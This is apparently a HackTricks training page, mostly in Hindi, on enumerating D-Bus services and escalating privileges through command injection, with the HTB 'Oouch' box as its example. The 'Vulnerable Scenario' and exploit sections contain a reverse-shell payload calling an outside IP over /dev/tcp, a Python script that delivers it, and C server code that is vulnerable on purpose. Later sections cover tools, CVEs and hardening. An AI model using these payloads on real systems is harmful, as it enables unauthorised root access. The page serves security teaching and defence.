# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus का उपयोग Ubuntu desktop environments में inter-process communications (IPC) mediator के रूप में किया जाता है। Ubuntu पर कई message buses का concurrent operation देखा जाता है: system bus, जिसका मुख्य रूप से **privileged services द्वारा पूरे system से संबंधित services expose करने के लिए** उपयोग किया जाता है, और प्रत्येक logged-in user के लिए एक session bus, जो केवल उस specific user से संबंधित services expose करता है। यहां मुख्य focus system bus पर है, क्योंकि यह higher privileges (जैसे root) के साथ चलने वाली services से संबद्ध है और हमारा objective privileges elevate करना है। यह ध्यान देने योग्य है कि D-Bus architecture प्रत्येक session bus के लिए एक 'router' का उपयोग करता है, जो clients द्वारा उस service के लिए निर्दिष्ट address के आधार पर client messages को appropriate services की ओर redirect करने के लिए responsible होता है।

D-Bus पर services उनके द्वारा expose किए जाने वाले **objects** और **interfaces** द्वारा defined होती हैं। Objects की तुलना standard OOP languages में class instances से की जा सकती है, जिसमें प्रत्येक instance को एक **object path** द्वारा uniquely identify किया जाता है। यह path, filesystem path के समान, service द्वारा expose किए गए प्रत्येक object को uniquely identify करता है। Research purposes के लिए एक key interface **org.freedesktop.DBus.Introspectable** है, जिसमें एक singular method, Introspect, शामिल है। यह method object के supported methods, signals और properties का XML representation return करता है; यहां focus methods पर है और properties तथा signals को omit किया गया है।

D-Bus interface के साथ communication के लिए दो tools का उपयोग किया गया: **gdbus** नामक CLI tool, जिसका उपयोग scripts में D-Bus द्वारा expose किए गए methods को आसानी से invoke करने के लिए किया जाता है, और [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), एक Python-based GUI tool जिसे प्रत्येक bus पर उपलब्ध services को enumerate करने और प्रत्येक service के भीतर मौजूद objects को display करने के लिए design किया गया है।
```bash
sudo apt-get install d-feet
```
यदि आप **session bus** की जाँच कर रहे हैं, तो पहले वर्तमान address की पुष्टि करें:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

पहली image में D-Bus system bus के साथ registered services दिखाई गई हैं, जिसमें System Bus button चुनने के बाद **org.debin.apt** को विशेष रूप से highlight किया गया है। D-Feet इस service से objects के बारे में query करता है और चुने गए objects के interfaces, methods, properties और signals को दूसरी image में दिखाता है। प्रत्येक method का signature भी विस्तार से प्रदर्शित किया जाता है।

एक महत्वपूर्ण feature service का **process ID (pid)** और **command line** दिखाना है, जो यह confirm करने के लिए उपयोगी है कि service elevated privileges के साथ चल रही है या नहीं। यह research relevance के लिए महत्वपूर्ण है।

**D-Feet method invocation की सुविधा भी देता है**: users parameters के रूप में Python expressions input कर सकते हैं, जिन्हें D-Feet service को भेजने से पहले D-Bus types में convert करता है।

हालांकि, ध्यान दें कि कुछ methods को invoke करने की अनुमति देने से पहले authentication की आवश्यकता होती है। हम इन methods को ignore करेंगे, क्योंकि हमारा लक्ष्य शुरू से ही credentials के बिना अपने privileges को elevate करना है।

यह भी ध्यान दें कि कुछ services किसी user को कुछ actions perform करने की अनुमति होनी चाहिए या नहीं, यह जांचने के लिए org.freedeskto.PolicyKit1 नामक किसी अन्य D-Bus service को query करती हैं।

## **Cmd line Enumeration**

### List Service Objects

Opened D-Bus interfaces को इस command से list करना संभव है:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
**`(activatable)`** के रूप में चिह्नित Services विशेष रूप से रुचिकर हैं, क्योंकि वे **अभी चल नहीं रही हैं**, लेकिन bus request उन्हें आवश्यकता पड़ने पर शुरू कर सकती है। `busctl list` पर न रुकें; उन नामों को उन वास्तविक binaries से map करें जिन्हें वे execute करेंगी।
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
इससे आपको तुरंत पता चल जाता है कि activatable name के लिए कौन-सा `Exec=` path शुरू होगा और किस identity के अंतर्गत। यदि binary या उसकी execution chain पर्याप्त रूप से protected नहीं है, तो inactive service भी privilege-escalation path बन सकती है।

#### Connections

[विकिपीडिया से:](https://en.wikipedia.org/wiki/D-Bus) जब कोई process किसी bus से connection स्थापित करता है, तो bus उस connection को एक विशेष bus name assign करता है, जिसे _unique connection name_ कहा जाता है। इस प्रकार के bus names immutable होते हैं—यह सुनिश्चित होता है कि connection मौजूद रहने तक वे बदलेंगे नहीं और, इससे भी महत्वपूर्ण बात यह है कि bus के lifetime के दौरान उनका दोबारा उपयोग नहीं किया जा सकता। इसका अर्थ है कि उस bus का कोई अन्य connection कभी भी ऐसा unique connection name assign नहीं कर पाएगा, भले ही वही process bus से connection बंद करके नया connection बनाए। Unique connection names को आसानी से पहचाना जा सकता है, क्योंकि वे उस colon character से शुरू होते हैं, जो अन्यथा forbidden है।

### Service Object Info

इसके बाद, आप interface के बारे में कुछ जानकारी इस प्रकार प्राप्त कर सकते हैं:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
साथ ही bus name को उसकी `systemd` unit और executable path से संबद्ध करें:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
यह उस operational प्रश्न का उत्तर देता है जो privesc के दौरान महत्वपूर्ण होता है: **यदि कोई method call सफल होता है, तो कौन-सा वास्तविक binary और unit यह action करेगा?**

### किसी Service Object के Interfaces की सूची बनाएँ

आपके पास पर्याप्त permissions होनी चाहिए।
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### किसी Service Object के Interface का Introspection

ध्यान दें कि इस उदाहरण में `tree` parameter का उपयोग करके खोजे गए नवीनतम interface को चुना गया था (_पिछला अनुभाग देखें_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Interface `htb.oouch.Block` की method `.Block` पर ध्यान दें (जिसमें हमारी रुचि है)। अन्य columns में मौजूद "s" का अर्थ हो सकता है कि यह string की अपेक्षा कर रही है।

कुछ खतरनाक करने से पहले, किसी **read-oriented** या अन्यथा low-risk method को validate करें। इससे तीन मामलों को स्पष्ट रूप से अलग किया जा सकता है: गलत syntax, reachable लेकिन denied, या reachable और allowed।
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### D-Bus Methods को Policies और Actions से Correlate करें

Introspection आपको बताता है कि आप **क्या** call कर सकते हैं, लेकिन यह नहीं बताता कि कोई call **क्यों** allowed या denied है। वास्तविक privesc triage के लिए आमतौर पर आपको **तीनों layers को एक साथ** inspect करना होता है:

1. **Activation metadata** (`.service` files या `SystemdService=`), ताकि पता चल सके कि वास्तव में कौन-सा binary और unit run होगा।
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`), ताकि पता चल सके कि कौन `own`, `send_destination`, या `receive_sender` कर सकता है।
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`), ताकि default authorization model (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`) का पता चल सके।

Useful commands:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Do **not** assume a 1:1 mapping between a D-Bus method और एक Polkit action. वही method, modify किए जा रहे object या runtime context के आधार पर अलग action चुन सकता है। इसलिए practical workflow यह है:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` और संबंधित `.policy` files में grep करें
3. `busctl call`, `gdbus call`, या `dbusmap --enable-probes --null-agent` के साथ low-risk live probes

Proxy या compatibility services पर विशेष ध्यान दें। एक **root-running proxy**, जो अपनी पहले से स्थापित connection के माध्यम से requests को किसी अन्य D-Bus service तक forward करता है, अनजाने में backend को हर request को UID 0 से आती हुई request मानने पर मजबूर कर सकता है, जब तक कि original caller identity को दोबारा validate न किया जाए।

### Monitor/Capture Interface

पर्याप्त privileges के साथ (`send_destination` और `receive_sender` privileges अकेले पर्याप्त नहीं हैं) आप **D-Bus communication को monitor** कर सकते हैं।

किसी **communication को monitor** करने के लिए आपको **root** होना आवश्यक है। यदि root होने पर भी आपको problems मिलें, तो [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) और [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) देखें।

> [!WARNING]
> यदि आप जानते हैं कि D-Bus config file को इस तरह configure कैसे करें कि **non root users communication को sniff** कर सकें, तो कृपया **मुझसे संपर्क करें**!

Monitor करने के अलग-अलग तरीके:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
निम्नलिखित उदाहरण में interface `htb.oouch.Block` की निगरानी की जाती है और **message "**_**lalalalal**_**" miscommunication के माध्यम से भेजा जाता है**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
आप परिणामों को सहेजने के लिए `monitor` के बजाय `capture` का उपयोग कर सकते हैं, जिसे Wireshark खोल सकता है:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### सभी noise को filter करना <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

यदि bus पर बहुत अधिक information हो, तो इस तरह एक match rule पास करें:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
कई rules निर्दिष्ट किए जा सकते हैं। यदि कोई message _किसी भी_ rule से match करता है, तो message print किया जाएगा। इस प्रकार:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
अधिक जानकारी के लिए match rule syntax पर [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) देखें।

### और

`busctl` में और भी options हैं, [**सभी options यहां देखें**](https://www.freedesktop.org/software/systemd/man/busctl.html)।

## **Vulnerable Scenario**

HTB के host "oouch" के अंदर user **qtc** के रूप में आपको _/etc/dbus-1/system.d/htb.oouch.Block.conf_ में स्थित एक **unexpected D-Bus config file** मिल सकती है:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
पिछली configuration से ध्यान दें कि इस D-BUS communication के माध्यम से information भेजने और प्राप्त करने के लिए **आपको user `root` या `www-data` होना आवश्यक है**।

Docker container **aeb4525789d8** के अंदर user **qtc** के रूप में, आप _/code/oouch/routes.py_ file में dbus से संबंधित कुछ code पा सकते हैं। यह interesting code है:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
जैसा कि आप देख सकते हैं, यह **D-Bus interface से connect** हो रहा है और **"Block" function** को "client_ip" भेज रहा है।

D-Bus connection के दूसरी ओर एक C compiled binary चल रही है। यह code **IP address के लिए D-Bus connection पर listening** कर रहा है और दिए गए IP address को block करने के लिए `system` function के माध्यम से iptables call कर रहा है।\
**`system` को call करना जानबूझकर command injection के लिए vulnerable है**, इसलिए निम्न payload जैसा payload reverse shell बनाएगा: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### इसे Exploit करें

इस page के अंत में आपको **D-Bus application का complete C code** मिलेगा। इसके अंदर lines 91-97 के बीच आप देख सकते हैं कि **`D-Bus object path`** और **`interface name`** किस प्रकार **registered** हैं। D-Bus connection को information भेजने के लिए यह information आवश्यक होगी:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
साथ ही, line 57 में आप देख सकते हैं कि इस D-Bus communication के लिए **केवल `Block` नामक method registered** है(_**इसीलिए अगले section में payloads को service object `htb.oouch.Block`, interface `/htb/oouch/Block` और method name `Block` पर भेजा जाएगा**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

निम्नलिखित Python code `block_iface.Block(runme)` के माध्यम से `Block` method को payload भेजेगा (_ध्यान दें कि इसे पिछले code chunk से extract किया गया था_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl और dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` एक tool है जिसका उपयोग “Message Bus” को message भेजने के लिए किया जाता है।
- Message Bus – यह एक software है जिसका उपयोग systems द्वारा applications के बीच communication को आसान बनाने के लिए किया जाता है। यह Message Queue से संबंधित है (messages sequence में ordered होते हैं), लेकिन Message Bus में messages subscription model में और बहुत तेज़ी से भेजे जाते हैं।
- “-system” tag का उपयोग यह बताने के लिए किया जाता है कि यह system message है, session message नहीं (by default)।
- “–print-reply” tag हमारे message को उचित रूप से print करने और किसी भी reply को human-readable format में प्राप्त करने के लिए उपयोग किया जाता है।
- “–dest=Dbus-Interface-Block” Dbus interface का address है।
- “–string:” – यह उस message का type है जिसे हम interface को भेजना चाहते हैं। messages भेजने के कई formats होते हैं, जैसे double, bytes, booleans, int, objpath। इनमें “object path” तब उपयोगी होता है जब हम Dbus interface को किसी file का path भेजना चाहते हैं। इस मामले में हम एक special file (FIFO) का उपयोग करके file के नाम के माध्यम से interface को कोई command भेज सकते हैं। “string:;” – इसका उपयोग object path को फिर से call करने के लिए किया जाता है, जहाँ हम FIFO reverse shell file/command रखते हैं।

_Note करें कि `htb.oouch.Block.Block` में, पहला भाग (`htb.oouch.Block`) service object को reference करता है और अंतिम भाग (`.Block`) method name को reference करता है।_

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

बड़े D-Bus attack surface की `busctl`/`gdbus` से manually Enumeration करना जल्दी ही कठिन हो जाता है। पिछले कुछ वर्षों में जारी की गई दो छोटी FOSS utilities red-team या CTF engagements के दौरान प्रक्रिया को तेज कर सकती हैं:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* C में लिखा गया है; single static binary (<50 kB), जो हर object path को traverse करता है, `Introspect` XML प्राप्त करता है और उसे owning PID/UID से map करता है।
* Useful flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* यह tool unprotected well-known names को `!` से mark करता है, जिससे तुरंत पता चलता है कि किन services को आप *own* (take over) कर सकते हैं या कौन-से method calls unprivileged shell से reachable हैं।

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* यह Python-only script systemd units में *writable* paths और अत्यधिक permissive D-Bus policy files (जैसे `send_destination="*"`) खोजती है।
* Quick usage:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* D-Bus module नीचे दी गई directories को search करता है और ऐसी किसी भी service को highlight करता है जिसे normal user spoof या hijack कर सकता है:
* `/etc/dbus-1/system.d/` और `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Notable D-Bus Privilege-Escalation Bugs (2024-2025)

हाल ही में published CVEs पर नज़र रखने से custom code में similar insecure patterns पहचानने में सहायता मिलती है। दो अच्छे recent examples हैं:

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | root के रूप में चलने वाली service ने ऐसा D-Bus interface expose किया जिसे unprivileged users reconfigure कर सकते थे, जिसमें attacker-controlled macro behavior load करना भी शामिल था। | यदि कोई daemon system bus पर **device/profile/config management** expose करता है, तो writable configuration और macro features को केवल "settings" नहीं, बल्कि code-execution primitives मानें। |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | root के रूप में चलने वाला compatibility proxy original caller का security context preserve किए बिना backend services को requests forward करता था, इसलिए backends proxy पर UID 0 के रूप में trust करते थे। | **proxy / bridge / compatibility** D-Bus services को अलग bug class मानें: यदि वे privileged calls relay करते हैं, तो verify करें कि caller UID/Polkit context backend तक कैसे पहुँचता है। |

ध्यान देने योग्य patterns:
1. Service **system bus पर root के रूप में चलती है**।
2. या तो **कोई authorization check नहीं** होता, या check **गलत subject** के विरुद्ध किया जाता है।
3. Reachable method अंततः system state में बदलाव करता है: package install, user/group changes, bootloader config, device profile updates, file writes या direct command execution।

किसी method के reachable होने की पुष्टि करने के लिए `dbusmap --enable-probes` या manual `busctl call` का उपयोग करें, फिर service की policy XML और Polkit actions inspect करें ताकि समझ सकें कि वास्तव में **किस subject** को authorize किया जा रहा है।

---

## Hardening & Detection Quick-Wins

* World-writable या *send/receive*-open policies खोजें:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Dangerous methods के लिए Polkit अनिवार्य करें – यहाँ तक कि *root* proxies को भी अपने PID के बजाय `polkit_authority_check_authorization_sync()` में *caller* PID pass करना चाहिए।
* Long-running helpers में privileges drop करें (bus से connect करने के बाद namespaces switch करने के लिए `sd_pid_get_owner_uid()` का उपयोग करें)।
* यदि किसी service को remove नहीं कर सकते, तो कम-से-कम उसे dedicated Unix group तक *scope* करें और उसकी XML policy में access restrict करें।
* Blue-team: `busctl capture > /var/log/dbus_$(date +%F).pcapng` से system bus capture करें और anomaly detection के लिए उसे Wireshark में import करें।

---

## References

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
